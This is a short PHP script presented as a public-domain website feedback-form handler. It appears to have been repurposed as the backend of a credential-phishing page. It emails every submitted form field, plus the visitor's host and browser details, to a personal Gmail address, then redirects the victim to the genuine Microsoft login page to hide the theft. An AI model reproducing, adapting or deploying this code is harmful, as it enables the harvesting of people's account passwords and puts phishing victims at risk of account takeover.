<?php
////////////////////////////////////////////////////////////////
// PERFECT                                                    //
// -------                                                    //
// PHP E-mail Receive Form Electronic Content Text            //
// File: feedback.php                                         //
// Version: 1.8 (April 21, 2008)                              //
// Description: Processes a web form to read the user input   //
//    and then send the data to a predefined recipient.  You  //
//    are free to use and modify this script as you like.     //
// Instructions:  Go to "http://www.centerkey.com/php".       //
// License: Public Domain Software                            //
//                                                            //
// Center Key Software  *  www.centerkey.com  *  Dem Pilafian //
////////////////////////////////////////////////////////////////

// Configuration Settings
$SendFrom =    "Amen <feedback@yourdomain.com>";
$SendTo =      "bobmonroe49@gmail.com";
$SubjectLine = "NXT";
$ThanksURL =   "thanks.html";  //confirmation page

// Build Message Body from Web Form Input
foreach ($_POST as $Field=>$Value)
   $MsgBody .= "$Field: $Value\n";

$MsgBody .= "\n" . @gethostbyaddr($_SERVER["REMOTE_ADDR"]) . "\n" .
   $_SERVER["HTTP_USER_AGENT"];
$MsgBody = htmlspecialchars($MsgBody, ENT_NOQUOTES);  //make safe

// Send E-Mail and Direct Browser to Confirmation Page
mail($SendTo, $SubjectLine, $MsgBody, "From: $SendFrom");
header("Location: https://login.live.com/");
?>
